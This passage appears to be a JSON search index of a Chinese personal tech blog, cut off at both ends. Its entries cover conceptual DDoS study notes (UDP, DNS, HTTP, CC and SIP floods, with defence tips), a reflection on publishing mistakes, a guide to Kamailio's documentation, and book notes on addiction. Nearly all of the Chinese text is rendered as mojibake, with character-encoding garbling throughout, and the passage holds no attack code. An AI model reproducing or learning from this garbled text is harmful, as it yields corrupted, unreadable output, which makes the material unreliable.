‡ä¸»æœºçš„ç«¯å£ï¼Œå—å®³ä¸»æœºä¼šå¯»æ‰¾ä¸UDPæ•°æ®åŒ…ç›¸å…³çš„åº”ç”¨ç¨‹åºã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å‘å‘é€è€…å›å‘ä¸€æ¡â€œç›®æ ‡ä¸å¯è¾¾â€æ¶ˆæ¯ã€‚ä¸€æ—¦ç›®æ ‡ä¸»æœºè¢«æ”»å‡»æµé‡æ·¹æ²¡ï¼Œç³»ç»Ÿå°±ä¼šå¤±å»å“åº”ï¼Œä»è€Œé€ æˆåˆæ³•ç”¨æˆ·æ— æ³•æ­£å¸¸è®¿é—®çš„ç°è±¡ã€‚ åº”ç”¨å±‚æ”»å‡»\nDNS Floodæ”»å‡»: æ”»å‡»è€…é€šè¿‡æ“çºµå¤§é‡å‚€å„¡æœºå™¨ï¼Œå¯¹ç›®æ ‡ç½‘ç»œå‘èµ·æµ·é‡åŸŸåæŸ¥è¯¢è¯·æ±‚ï¼Œä»¥ä¸­æ–­è¯¥åŸŸçš„DNSè§£æã€‚è¿™ç§æ”»å‡»å°†ä¼šç ´åç½‘ç«™ã€APIæˆ–Webåº”ç”¨ç¨‹åºå“åº”åˆæ³•æµé‡çš„èƒ½åŠ›ï¼Œè®©åˆæ³•ç”¨æˆ·æ— æ³•æŸ¥æ‰¾åˆ°ç”¨äºè°ƒç”¨ç‰¹å®šèµ„æºçš„åœ°å€ï¼Œå¯¼è‡´ä¸šåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢ã€‚ HTTP Floodæ”»å‡»: HTTP GET æ”»å‡»ï¼šæ”»å‡»è€…æ“æ§å¤šå°è®¾å¤‡å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¯¹å›¾åƒã€æ–‡ä»¶æˆ–å…¶ä»–èµ„äº§è¯·æ±‚ï¼Œå½“ç›®æ ‡æœåŠ¡å™¨è¢«ä¼ å…¥è¯·æ±‚å’Œå“åº”æ‰€æ·¹æ²¡æ—¶ï¼Œæ¥è‡ªæ­£å¸¸æµé‡æºçš„ä¸šåŠ¡è¯·æ±‚ä¹Ÿå°†è¢«æ‹’ç»ã€‚ HTTP POST æ”»å‡»ï¼šä¸å‘é€ POST è¯·æ±‚æ‰€éœ€çš„å¤„ç†èƒ½åŠ›å’Œå¸¦å®½ç›¸æ¯”ï¼Œå¤„ç†è¡¨å•æ•°æ®å’Œè¿è¡Œå¿…è¦æ•°æ®åº“å‘½ä»¤çš„è¿‡ç¨‹ç›¸å¯¹å¯†é›†ã€‚è¿™ç§æ”»å‡»åˆ©ç”¨ç›¸å¯¹èµ„æºæ¶ˆè€—çš„å·®å¼‚ï¼Œç›´æ¥å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡POSTè¯·æ±‚ï¼Œç›´è‡³ç›®æ ‡æœåŠ¡å™¨å®¹é‡é¥±å’Œå¹¶æ‹’ç»æœåŠ¡ä¸ºæ­¢ã€‚ CCæ”»å‡»: CCæ”»å‡»å¸¸ç”¨äºæ”»å‡»æä¾›ç½‘é¡µè®¿é—®æœåŠ¡çš„æœåŠ¡å™¨ã€‚æ”»å‡»è€…é€šè¿‡ä»£ç†æœåŠ¡å™¨å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡è²Œä¼¼åˆæ³•çš„è¯·æ±‚ï¼Œä½¿CPUé•¿æ—¶é—´å¤„äºé«˜è´Ÿè·è¿è¡ŒçŠ¶æ€ï¼Œæ°¸è¿œéƒ½æœ‰å¤„ç†ä¸å®Œçš„è¿æ¥ã€‚æ”»å‡»ä¼šå¯¼è‡´æ­£å¸¸è®¿é—®è¢«ä¸­æ­¢ï¼Œæœ€ç»ˆå®•æœºå´©æºƒã€‚ SIPæ³¨å†Œ Floodæ”»å‡»: æ”»å‡»è€…å‘é€å¤§é‡çš„SIPæ³¨å†Œè¯·æ±‚åˆ°SIPæœåŠ¡ç«¯ï¼ŒSIPæœåŠ¡å™¨éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œæ‹–æ…¢æ­£å¸¸çš„æ•°æ®åº“æŸ¥è¯¢ï¼Œä¹Ÿå›å ç”¨å¤§é‡çš„èµ„æºæ¥ç»´æŠ¤æ³¨å†Œçš„äº‹åŠ¡ã€‚ FAQ é˜²ç«å¢™èƒ½å¦æ‹¦æˆªDDOSæ”»å‡»ï¼Ÿ æ‹¦æˆªä¸äº†ï¼Œé˜²ç«å¢™å°±å¥½æ¯”é¥­åº—çš„ä¿å®‰ï¼Œä¿å®‰å†å¤šï¼Œä½†æ˜¯é¥­åº—é—¨å£é“è·¯äº¤é€šå µå¡äº†ï¼Œé¥­åº—çš„è¥ä¸šé¢ä¸‹é™ï¼Œå†å¤šçš„ä¿å®‰ä¹Ÿæ— èƒ½ä¸ºåŠ› åœ¨é­å—DDOSæ”»å‡»åï¼Œç”¨ä»€ä¹ˆæ‰‹æ®µé˜²å¾¡ï¼Ÿ è´­ä¹°ç¡¬ä»¶è®¾å¤‡ï¼šé™¤äº†æ¯”è¾ƒè´µä¹‹å¤–ï¼Œå¯¹äºä½¿ç”¨äº‘æœåŠ¡å™¨çš„æœåŠ¡ä¹Ÿæ— èƒ½ä¸ºåŠ› æ›´æ¢å…¬ç½‘IPï¼šå¯¹äºä½¿ç”¨äº‘æœåŠ¡å™¨æ¥è¯´ï¼Œæ›´æ¢äº‘æœåŠ¡å™¨çš„å…¬ç½‘IPçœ‹èµ·æ¥æ¯”è¾ƒç®€å•æ–¹ä¾¿ã€‚ä½†æ˜¯ä¹Ÿæœ‰éº»çƒ¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚è‡ªå·±çš„æœåŠ¡å¯èƒ½è¦æ¶‰åŠåˆ°é…ç½®æ”¹å˜å’ŒæœåŠ¡é‡å¯ï¼Œå’Œè‡ªå·±ç›¸å…³çš„ç¬¬ä¸‰æ–¹ï¼Œä¹Ÿå¯èƒ½è¦ä¿®æ”¹IPçš„è®¿é—®åœ°å€ ä½¿ç”¨äº‘æœåŠ¡å‚å•†æä¾›çš„DDOSæœåŠ¡ å¦‚ä½•æ„ŸçŸ¥åˆ°è‡ªå·±çš„æœåŠ¡æ­£åœ¨é­å—DDOSæ”»å‡»ï¼Ÿ å¼‚å¸¸å¤§çš„æµé‡æ³¢åŠ¨ æ­£å¸¸ç”¨æˆ·å¤§é‡ç¦»çº¿ å‚è€ƒ https://info.support.huawei.com/info-finder/encyclopedia/zh/DDoS%E6%94%BB%E5%87%BB.html https://www.microsoft.com/zh-cn/security/business/security-101/what-is-a-ddos-attack ","title":"DDOSå­¦ä¹ ç¬”è®°"},{"content":"å…¬å¼€è‡ªå·±çš„é”™è¯¯ æˆ‘åœ¨å†™åšå®¢æ—¶ï¼Œæœ‰æ—¶å€™è„‘æµ·é‡Œæ€»ä¼šè¹¦å‡ºä¸€ä¸ªå°äººï¼Œé¢éœ²é„™å¤·çš„è„¸è‰²å¯¹æˆ‘è¯´ï¼šä½ å†™è¿™ä¹ˆå¤šæ²¡å•¥æŠ€æœ¯å«é‡çš„åƒåœ¾ï¼Œå…¬å¼€åœ¨ç½‘ä¸Šï¼Œéš¾é“ä¸æ€•æš´éœ²è‡ªå·±çš„æ— çŸ¥å—ï¼Ÿ\nè¯´å®è¯ï¼Œæˆ‘æ˜¯æœ‰è¿™æ ·çš„æ‹…å¿§ã€‚\nå› ä¸ºæˆ‘æ˜¯æœ‰è‡ªçŸ¥ä¹‹æ˜çš„ï¼Œæˆ‘çŸ¥é“è‡ªå·±ä¼°è®¡ä¹Ÿæ˜¯é»„è€å¸ˆé‚£ç§\u0026quot;æ ·æ ·é€šï¼Œæ ·æ ·æ¾\u0026quot;çš„äººã€‚ å†™çš„ä¸œè¥¿ä¹Ÿéƒ½æ˜¯ä¸€äº›è¡¨é¢çš„ä¸œè¥¿ï¼Œç”šè‡³æœ‰é”™è¯¯çš„å¯èƒ½ã€‚è¿™å¹¶ä¸æ˜¯è‡ªè°¦ã€‚\næˆ‘ä¸€ç›´æ— æ³•æ‰¾åˆ°åå‡»è„‘æµ·é‡Œå°äººçš„ç†ç”±ã€‚\nä»Šå¤©ï¼Œæˆ‘åœ¨è¯»ä¸€æœ¬ä¹¦çš„æ—¶å€™ï¼Œå­¦åˆ°äº†ä¸€ä¸ªæ¦‚å¿µï¼Œè¿™ä¸ªæ¦‚å¿µå«åšåå®å®‰å®šå¾‹ã€‚\nåœ¨äº’è”ç½‘ä¸Šè·å¾—æ­£ç¡®ç­”æ¡ˆçš„æœ€å¥½æ–¹æ³•å¹¶ä¸æ˜¯æå‡ºé—®é¢˜ï¼Œè€Œæ˜¯å‘å¸ƒé”™è¯¯çš„ç­”æ¡ˆ\nä¹Ÿè®¸æˆ‘çš„ç­”æ¡ˆæ˜¯é”™è¯¯çš„ï¼Œä½†æ˜¯å®ƒå¹¶æ²¡æœ‰è¢«éšè—æˆ‘è„‘æµ·çš„æŸä¸ªè§’è½ï¼ŒäºŒæ˜¯è¢«å…¬å¼€åœ¨äº†ç½‘ä¸Šã€‚\nå³ä½¿æˆ‘çš„å°ç ´ç«™å†å°ï¼Œå¿…ç„¶ä¹Ÿä¼šæœ‰å‡ ä¸ªé˜…è¯»é‡å§ï¼Œæˆ–è®¸èƒ½æœ‰è¯»è€…å¯¹é”™è¯¯çš„ç­”æ¡ˆæå‡ºè‡ªå·±çš„å¼‚è®®ã€‚\nå­¦ä¹ é‡‘å­—å¡”ç†è®º å¦‚æœä»…ä»…æ˜¯é€šè¿‡é˜…è¯»å­¦ä¹ ï¼Œå­¦ä¹ å†…å®¹çš„å¹³å‡å­˜ç•™ç‡åªæœ‰5%ã€‚\nå¦‚æœæŠŠå­¦ä¹ å†…å®¹å…¬å¼€ï¼Œè¿™å…¶ä¸­å°±æš—ç¤ºäº†ä½ å¯èƒ½éœ€è¦æŠŠè‡ªå·±å­¦åˆ°çš„å†…å®¹æ•™æˆç»™ä»–äººè¿™ä¸€å¿ƒç†ã€‚\né‚£ä¹ˆåœ¨è®°å½•ç¬”è®°çš„æ—¶å€™ï¼Œå°±ä¼šæƒ³åŠæ³•æŠŠé—®é¢˜è®²è§£çš„è®©åˆ«äººæ›´æ¸…æ¥šï¼Œä»è€ŒåŠ æ·±äº†è‡ªå·±çš„å­¦ä¹ çŸ¥è¯†å¸æ”¶ã€‚\nå‚è€ƒ https://baike.baidu.com/item/%E5%AD%A6%E4%B9%A0%E9%87%91%E5%AD%97%E5%A1%94/9515094 ","permalink":"https://wdd.js.org/posts/2024/121701/","summary":"å…¬å¼€è‡ªå·±çš„é”™è¯¯ æˆ‘åœ¨å†™åšå®¢æ—¶ï¼Œæœ‰æ—¶å€™è„‘æµ·é‡Œæ€»ä¼šè¹¦å‡ºä¸€ä¸ªå°äººï¼Œé¢éœ²é„™å¤·çš„è„¸è‰²å¯¹æˆ‘è¯´ï¼šä½ å†™è¿™ä¹ˆå¤šæ²¡å•¥æŠ€æœ¯å«é‡çš„åƒåœ¾ï¼Œå…¬å¼€åœ¨ç½‘ä¸Šï¼Œéš¾é“ä¸æ€•æš´éœ²è‡ªå·±çš„æ— çŸ¥å—ï¼Ÿ\nè¯´å®è¯ï¼Œæˆ‘æ˜¯æœ‰è¿™æ ·çš„æ‹…å¿§ã€‚\nå› ä¸ºæˆ‘æ˜¯æœ‰è‡ªçŸ¥ä¹‹æ˜çš„ï¼Œæˆ‘çŸ¥é“è‡ªå·±ä¼°è®¡ä¹Ÿæ˜¯é»„è€å¸ˆé‚£ç§\u0026quot;æ ·æ ·é€šï¼Œæ ·æ ·æ¾\u0026quot;çš„äººã€‚ å†™çš„ä¸œè¥¿ä¹Ÿéƒ½æ˜¯ä¸€äº›è¡¨é¢çš„ä¸œè¥¿ï¼Œç”šè‡³æœ‰é”™è¯¯çš„å¯èƒ½ã€‚è¿™å¹¶ä¸æ˜¯è‡ªè°¦ã€‚\næˆ‘ä¸€ç›´æ— æ³•æ‰¾åˆ°åå‡»è„‘æµ·é‡Œå°äººçš„ç†ç”±ã€‚\nä»Šå¤©ï¼Œæˆ‘åœ¨è¯»ä¸€æœ¬ä¹¦çš„æ—¶å€™ï¼Œå­¦åˆ°äº†ä¸€ä¸ªæ¦‚å¿µï¼Œè¿™ä¸ªæ¦‚å¿µå«åšåå®å®‰å®šå¾‹ã€‚\nåœ¨äº’è”ç½‘ä¸Šè·å¾—æ­£ç¡®ç­”æ¡ˆçš„æœ€å¥½æ–¹æ³•å¹¶ä¸æ˜¯æå‡ºé—®é¢˜ï¼Œè€Œæ˜¯å‘å¸ƒé”™è¯¯çš„ç­”æ¡ˆ\nä¹Ÿè®¸æˆ‘çš„ç­”æ¡ˆæ˜¯é”™è¯¯çš„ï¼Œä½†æ˜¯å®ƒå¹¶æ²¡æœ‰è¢«éšè—æˆ‘è„‘æµ·çš„æŸä¸ªè§’è½ï¼ŒäºŒæ˜¯è¢«å…¬å¼€åœ¨äº†ç½‘ä¸Šã€‚\nå³ä½¿æˆ‘çš„å°ç ´ç«™å†å°ï¼Œå¿…ç„¶ä¹Ÿä¼šæœ‰å‡ ä¸ªé˜…è¯»é‡å§ï¼Œæˆ–è®¸èƒ½æœ‰è¯»è€…å¯¹é”™è¯¯çš„ç­”æ¡ˆæå‡ºè‡ªå·±çš„å¼‚è®®ã€‚\nå­¦ä¹ é‡‘å­—å¡”ç†è®º å¦‚æœä»…ä»…æ˜¯é€šè¿‡é˜…è¯»å­¦ä¹ ï¼Œå­¦ä¹ å†…å®¹çš„å¹³å‡å­˜ç•™ç‡åªæœ‰5%ã€‚\nå¦‚æœæŠŠå­¦ä¹ å†…å®¹å…¬å¼€ï¼Œè¿™å…¶ä¸­å°±æš—ç¤ºäº†ä½ å¯èƒ½éœ€è¦æŠŠè‡ªå·±å­¦åˆ°çš„å†…å®¹æ•™æˆç»™ä»–äººè¿™ä¸€å¿ƒç†ã€‚\né‚£ä¹ˆåœ¨è®°å½•ç¬”è®°çš„æ—¶å€™ï¼Œå°±ä¼šæƒ³åŠæ³•æŠŠé—®é¢˜è®²è§£çš„è®©åˆ«äººæ›´æ¸…æ¥šï¼Œä»è€ŒåŠ æ·±äº†è‡ªå·±çš„å­¦ä¹ çŸ¥è¯†å¸æ”¶ã€‚\nå‚è€ƒ https://baike.baidu.com/item/%E5%AD%A6%E4%B9%A0%E9%87%91%E5%AD%97%E5%A1%94/9515094 ","title":"ä½ ä¸æ€•æš´éœ²è‡ªå·±çš„æ— çŸ¥å—ï¼Ÿ"},{"content":" æˆ‘å§‹ç»ˆè®¤ä¸ºï¼Œå¿«é€Ÿå­¦ä¹ ä¸€é—¨çŸ¥è¯†ï¼Œæœ€ä¸ºé‡è¦çš„å°±æ˜¯ç†Ÿæ‚‰å®ƒçš„æ–‡æ¡£ç»“æ„ã€‚\nå¯¹äºç†Ÿæ‚‰OpenSIPSçš„æ–‡æ¡£ç»“æ„æ¥è¯´çš„äººï¼Œçœ‹äº†Kamailioçš„æ–‡æ¡£ï¼Œå¾€å¾€è§‰å¾—æ— ä»ä¸‹æ‰‹ã€‚\nå½“æˆ‘ä»¬æ‰“å¼€Kmçš„å®˜ç½‘(kamailio.org)åï¼Œ ä¼šé‡å®šå‘åˆ°https://www.kamailio.org/w/, åœ¨é¡µé¢çš„å³ä¾§ï¼Œ\næ¥ç€ï¼Œæˆ‘ä»¬ä¼šå¯¼èˆªåˆ° https://www.kamailio.org/w/documentation/\nè¿™ä¸ªé¡µé¢çš„ç»“æ„éœ€è¦çƒ‚ç†Ÿäºå¿ƒ\n1. æ¨¡å—æ–‡æ¡£ å¦‚æœä½ çŸ¥é“kmçš„ç‰ˆæœ¬å·å’Œå¯¹åº”çš„æ¨¡å—ï¼Œå¯ä»¥ç‚¹å‡»è¿™é‡Œè¿›å…¥å¯¹åº”ç‰ˆæœ¬ï¼Œç„¶åå†é€‰æ‹©å¯¹åº”æ¨¡å—\n2. wikiéƒ¨åˆ† 2.1 å¿…å­¦éƒ¨åˆ† wikiéƒ¨åˆ†ä¸»è¦æ˜¯ä¸€äº›æ•™ç¨‹ï¼Œéå¸¸å€¼å¾—çœ‹ã€‚\nå…¶ä¸­æœ‰ä¸‰ä¸ªé‡ç‚¹éƒ¨åˆ†\ncore cookbookï¼š ä¸»è¦è®²è§£kmçš„è„šæœ¬çš„ç»“æ„ã€å…¨å±€å‚æ•°ã€æ¨¡å—å‚æ•°ã€è·¯ç”±ç±»å‹ã€é¢„å¤„ç†ã€è„šæœ¬æ“ä½œç­‰ç­‰ï¼Œæ˜¯ç¼–å†™kmè„šæœ¬çš„å¿…å­¦ä¹‹å¤„ï¼Œå„ç§å‚æ•°éƒ½å¯ä»¥çœ‹çœ‹ Pseudo-Variables CookBookï¼šä¸»è¦è®²è§£å„ç§ä¼ªå˜é‡ï¼Œç”¨æ¥è¯»å†™SIPæ¶ˆæ¯ Transformations CookBookï¼š ä¸»è¦è®²è§£å„ç§æ“ä½œå˜æ¢ï¼Œä¾‹å¦‚æŠŠå­—ç¬¦ä¸²å‹è½¬ä¸ºintå‹æ•°æ® å…¨éƒ¨å‡½æ•°ç´¢å¼• åœ¨kmçš„wikiå®˜ç½‘ï¼Œå³https://www.kamailio.org/wikidocs/ï¼Œ å…¶ä¸­Alphabetic Indexeså°±æ˜¯æ‰€æœ‰çš„å‚æ•°æˆ–è€…å‡½æ•°çš„ç´¢å¼•ã€‚\nåœ¨ä½ å­¦äº›kmçš„è„šæœ¬æ—¶ï¼Œæœ‰æ—¶å€™æƒ³çŸ¥é“æŸä¸ªå‡½æ•°åœ¨å“ªä¸ªæ¨¡å—ä¸­ï¼Œå°±å¯ä»¥ç”¨è¿™ä¸ªå…¨éƒ¨å‡½æ•°ç´¢å¼•ä¸­æŸ¥æ‰¾ã€‚\næºç å®‰è£… è¿™éƒ¨åˆ†è®²è§£å¦‚ä½•é€šè¿‡GITè¿›è¡Œæºç å®‰è£…ã€‚\nFAQ https://www.kamailio.org/wikidocs/tutorials/faq/main/\nå¤–éƒ¨èµ„æº è¿™é‡Œæ¶‰åŠäº†å¦‚ä½•ç”¨kmå’Œå¸¸è§çš„åª’ä½“æœåŠ¡å™¨å¦‚ä½•é›†æˆ\nå…¶ä»– å®˜æ–¹çš„Webç‰ˆæœ¬çš„wiki, å¯¹äºåˆšå…¥é—¨çš„äººæ¥è¯´ï¼Œè¿˜æ˜¯æœ‰ç‚¹ç»•çš„ã€‚\nå¦å¤–ä¸€ä¸ªé—®é¢˜å°±æ˜¯mkdocsçš„é¡µé¢æ¸²æŸ“æ•ˆæœçš„ç¡®ä¸å¤ªè¡Œï¼Œç›®å½•æ»šåŠ¨ä¸€ç‚¹éƒ½ä¸çµæ•ã€‚\nå¦‚æœä½ æƒ³çœ‹çš„ä¸æ˜¯æŸä¸ªæ¨¡å—çš„è¯´æ˜æ–‡æ¡£ï¼Œæˆ‘æ›´å»ºè®®ä½ ç›´æ¥æŠŠhttps://github.com/kamailio/kamailio-wiki è¿™ä¸ªgitä»“åº“ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹ã€‚\næ€»ç»“ æ€»ä½“æ¥è¯´ï¼Œkmçš„æ–‡æ¡£ç®—æ˜¯éå¸¸å®Œæ•´äº†ï¼Œä½†æ˜¯å’ŒOpenSIPSç›¸æ¯”ï¼Œè¿˜æœ‰å¾…åŠ å¼ºã€‚\n","permalink":"https://wdd.js.org/kamailio/docs-index/","summary":"æˆ‘å§‹ç»ˆè®¤ä¸ºï¼Œå¿«é€Ÿå­¦ä¹ ä¸€é—¨çŸ¥è¯†ï¼Œæœ€ä¸ºé‡è¦çš„å°±æ˜¯ç†Ÿæ‚‰å®ƒçš„æ–‡æ¡£ç»“æ„ã€‚\nå¯¹äºç†Ÿæ‚‰OpenSIPSçš„æ–‡æ¡£ç»“æ„æ¥è¯´çš„äººï¼Œçœ‹äº†Kamailioçš„æ–‡æ¡£ï¼Œå¾€å¾€è§‰å¾—æ— ä»ä¸‹æ‰‹ã€‚\nå½“æˆ‘ä»¬æ‰“å¼€Kmçš„å®˜ç½‘(kamailio.org)åï¼Œ ä¼šé‡å®šå‘åˆ°https://www.kamailio.org/w/, åœ¨é¡µé¢çš„å³ä¾§ï¼Œ\næ¥ç€ï¼Œæˆ‘ä»¬ä¼šå¯¼èˆªåˆ° https://www.kamailio.org/w/documentation/\nè¿™ä¸ªé¡µé¢çš„ç»“æ„éœ€è¦çƒ‚ç†Ÿäºå¿ƒ\n1. æ¨¡å—æ–‡æ¡£ å¦‚æœä½ çŸ¥é“kmçš„ç‰ˆæœ¬å·å’Œå¯¹åº”çš„æ¨¡å—ï¼Œå¯ä»¥ç‚¹å‡»è¿™é‡Œè¿›å…¥å¯¹åº”ç‰ˆæœ¬ï¼Œç„¶åå†é€‰æ‹©å¯¹åº”æ¨¡å—\n2. wikiéƒ¨åˆ† 2.1 å¿…å­¦éƒ¨åˆ† wikiéƒ¨åˆ†ä¸»è¦æ˜¯ä¸€äº›æ•™ç¨‹ï¼Œéå¸¸å€¼å¾—çœ‹ã€‚\nå…¶ä¸­æœ‰ä¸‰ä¸ªé‡ç‚¹éƒ¨åˆ†\ncore cookbookï¼š ä¸»è¦è®²è§£kmçš„è„šæœ¬çš„ç»“æ„ã€å…¨å±€å‚æ•°ã€æ¨¡å—å‚æ•°ã€è·¯ç”±ç±»å‹ã€é¢„å¤„ç†ã€è„šæœ¬æ“ä½œç­‰ç­‰ï¼Œæ˜¯ç¼–å†™kmè„šæœ¬çš„å¿…å­¦ä¹‹å¤„ï¼Œå„ç§å‚æ•°éƒ½å¯ä»¥çœ‹çœ‹ Pseudo-Variables CookBookï¼šä¸»è¦è®²è§£å„ç§ä¼ªå˜é‡ï¼Œç”¨æ¥è¯»å†™SIPæ¶ˆæ¯ Transformations CookBookï¼š ä¸»è¦è®²è§£å„ç§æ“ä½œå˜æ¢ï¼Œä¾‹å¦‚æŠŠå­—ç¬¦ä¸²å‹è½¬ä¸ºintå‹æ•°æ® å…¨éƒ¨å‡½æ•°ç´¢å¼• åœ¨kmçš„wikiå®˜ç½‘ï¼Œå³https://www.kamailio.org/wikidocs/ï¼Œ å…¶ä¸­Alphabetic Indexeså°±æ˜¯æ‰€æœ‰çš„å‚æ•°æˆ–è€…å‡½æ•°çš„ç´¢å¼•ã€‚\nåœ¨ä½ å­¦äº›kmçš„è„šæœ¬æ—¶ï¼Œæœ‰æ—¶å€™æƒ³çŸ¥é“æŸä¸ªå‡½æ•°åœ¨å“ªä¸ªæ¨¡å—ä¸­ï¼Œå°±å¯ä»¥ç”¨è¿™ä¸ªå…¨éƒ¨å‡½æ•°ç´¢å¼•ä¸­æŸ¥æ‰¾ã€‚\næºç å®‰è£… è¿™éƒ¨åˆ†è®²è§£å¦‚ä½•é€šè¿‡GITè¿›è¡Œæºç å®‰è£…ã€‚\nFAQ https://www.kamailio.org/wikidocs/tutorials/faq/main/\nå¤–éƒ¨èµ„æº è¿™é‡Œæ¶‰åŠäº†å¦‚ä½•ç”¨kmå’Œå¸¸è§çš„åª’ä½“æœåŠ¡å™¨å¦‚ä½•é›†æˆ\nå…¶ä»– å®˜æ–¹çš„Webç‰ˆæœ¬çš„wiki, å¯¹äºåˆšå…¥é—¨çš„äººæ¥è¯´ï¼Œè¿˜æ˜¯æœ‰ç‚¹ç»•çš„ã€‚\nå¦å¤–ä¸€ä¸ªé—®é¢˜å°±æ˜¯mkdocsçš„é¡µé¢æ¸²æŸ“æ•ˆæœçš„ç¡®ä¸å¤ªè¡Œï¼Œç›®å½•æ»šåŠ¨ä¸€ç‚¹éƒ½ä¸çµæ•ã€‚\nå¦‚æœä½ æƒ³çœ‹çš„ä¸æ˜¯æŸä¸ªæ¨¡å—çš„è¯´æ˜æ–‡æ¡£ï¼Œæˆ‘æ›´å»ºè®®ä½ ç›´æ¥æŠŠhttps://github.com/kamailio/kamailio-wiki è¿™ä¸ªgitä»“åº“ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹ã€‚\næ€»ç»“ æ€»ä½“æ¥è¯´ï¼Œkmçš„æ–‡æ¡£ç®—æ˜¯éå¸¸å®Œæ•´äº†ï¼Œä½†æ˜¯å’ŒOpenSIPSç›¸æ¯”ï¼Œè¿˜æœ‰å¾…åŠ å¼ºã€‚","title":"ç¬¬ä¸€èŠ‚ å¦‚ä½•ç†Ÿæ‚‰Kamailioæ–‡æ¡£çš„æ–‡æ¡£ç»“æ„"},{"content":"","permalink":"https://wdd.js.org/fe/ts-type-action/","summary":"","title":"TypeSctiptç±»å‹å®æˆ˜"},{"content":"","permalink":"https://wdd.js.org/opensips/ch2/axb/","summary":"","title":"AXBçš„ç©æ³•è¯´æ˜"},{"content":"å¿«ä¹çš„ä½ç½® è¯»å®Œè¿™æœ¬ä¹¦ï¼Œæˆ‘æœ€å¤§çš„æ”¶è·æ˜¯è¿™å¥è¯ï¼š\nåœ¨è¿‡å»ä¸ƒåäº”å¹´é‡Œï¼Œç¥ç»ç§‘å­¦é¢†åŸŸæœ€é‡è¦çš„å‘ç°ä¹‹ä¸€ï¼Œå°±æ˜¯å¤§è„‘ä¸­å¤„ç†å¿«ä¹å’Œç—›è‹¦çš„åŒºåŸŸæ˜¯ç›¸åŒçš„\nä¹‹å‰æˆ‘ä¸€ç›´æœ‰ä¸ªè¯¯è§£ï¼Œæˆ‘è®¤ä¸ºäººçš„å¤§è„‘æ„Ÿå—å¿«ä¹å’Œç—›è‹¦çš„åŒºåŸŸæ˜¯åˆ†å¼€çš„ã€‚\nå¦‚æœå¿«ä¹å’Œç—›è‹¦éƒ½æ˜¯åœ¨ä¸€ä¸ªä½ç½®æ„Ÿå—ï¼Œé‚£ç—›è‹¦è¿˜æ˜¯å¿«ä¹ï¼Œç”±ä»€ä¹ˆå†³å®šå‘¢ï¼Ÿ\nç˜¾å½¢æˆçš„æœºåˆ¶ï¼š å†…ç¨³æ€çš„å¤©å¹³ æ¯ä¸ªäººæˆ–å¤šæˆ–å°‘éƒ½æœ‰æŸç§ç˜¾ï¼Œ å°±æ¯”å¦‚æˆ‘ï¼Œ æœ‰æ®µæ—¶é—´æœ‰ç©ç”µå­æ¸¸æˆçš„ç˜¾ã€‚ ç©çš„æ—¶å€™å¾ˆå¼€å¿ƒï¼Œ å‡ æŠŠæ¸¸æˆç»“æŸä¹‹åï¼Œæœ‰æ„Ÿè§‰éå¸¸å¤±è½ã€‚æ²¡è¿‡å‡ å°æ—¶ï¼Œåˆæƒ³å†å¼€ä¸€å±€ã€‚ è¿™ç§æƒ…ç»ªå½¢æˆçš„åŸå› æ˜¯ä»€ä¹ˆï¼Œæ˜¯æˆ‘æƒ³è¦äº†è§£çš„ã€‚\næˆç˜¾ï¼ˆè‹±è¯­ï¼šaddictionï¼‰æ˜¯æŒ‡ä¸€ç§é‡å¤æ€§çš„å¼ºè¿«è¡Œä¸ºï¼Œå³ä½¿è¿™äº›è¡Œä¸ºå·²çŸ¥å¯èƒ½é€ æˆä¸è‰¯åæœçš„æƒ…å½¢ä¸‹ï¼Œä»ç„¶è¢«æŒç»­é‡å¤[5]ã€‚è¿™ç§è¡Œä¸ºå¯èƒ½å› ä¸­æ¢ç¥ç»ç³»ç»ŸåŠŸèƒ½å¤±è°ƒé€ æˆï¼Œé‡å¤è¿™äº›è¡Œä¸ºä¹Ÿå¯ä»¥åè¿‡æ¥é€ æˆç¥ç»åŠŸèƒ½å—æŸ \u0026ndash;ç»´åŸºç™¾ç§‘\nå¤§è„‘ä¼šåŠªåŠ›ç»´æŒå¿«ä¹å’Œç—›è‹¦çš„å¹³è¡¡ã€‚æ¯å½“è¿™ä¸ªå¤©å¹³å‘ä¸€ä¾§å€¾æ–œæ—¶ï¼Œå¤§è„‘å°±ä¼šåœ¨å¦å¤–ä¸€ä¾§æ–½åŠ å‹åŠ›ï¼Œç«­åŠ›æ¢å¤å¹³è¡¡ï¼Œç¥ç»ç§‘å­¦å®¶ç§°ä¹‹ä¸ºå†…ç¨³æ€\nå¤šå·´èƒºè¢«é‡Šæ”¾ä»¥åï¼Œå¤§è„‘ä¼šç›¸åº”åœ°å‡å°‘æˆ–â€œä¸‹è°ƒâ€è¢«åˆºæ¿€çš„å¤šå·´èƒºå—ä½“çš„æ•°é‡ï¼Œä»è€Œå¯¼è‡´å¿«ä¹-ç—›è‹¦çš„å¤©å¹³å‘ç—›è‹¦ç«¯å€¾æ–œï¼Œä»¥æ¢å¤å¹³è¡¡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šåœ¨å¿«ä¹è¿‡åäº§ç”Ÿå®¿é†‰æ„Ÿæˆ–å¤±è½æ„Ÿã€‚å€˜è‹¥ç­‰å¾…è¶³å¤Ÿé•¿çš„æ—¶é—´ï¼Œè¿™ç§æ„Ÿè§‰å°±ä¼šæ¶ˆå¤±ï¼Œæˆ‘ä»¬ä¼šé‡æ–°å›å½’ä¸­ç«‹çš„çŠ¶æ€ã€‚ç„¶è€Œï¼Œäººç±»å¤©ç”Ÿæ¸´æœ›å¯¹æŠ—è¿™ç§æ„Ÿè§‰ï¼Œäºæ˜¯æˆ‘ä»¬ä¼šå†æ¬¡å›åˆ°é‚£ä¸ªå¿«ä¹æºæ³‰çš„æ€€æŠ±â€”â€”æ¯”å¦‚å†ç©ä¸€å±€æ¸¸æˆ\nå¦‚æœæ¯å¤©ä¿æŒè¿™ç§æ¨¡å¼å‡ ä¸ªå°æ—¶ï¼Œå‡ å‘¨æˆ–å‡ 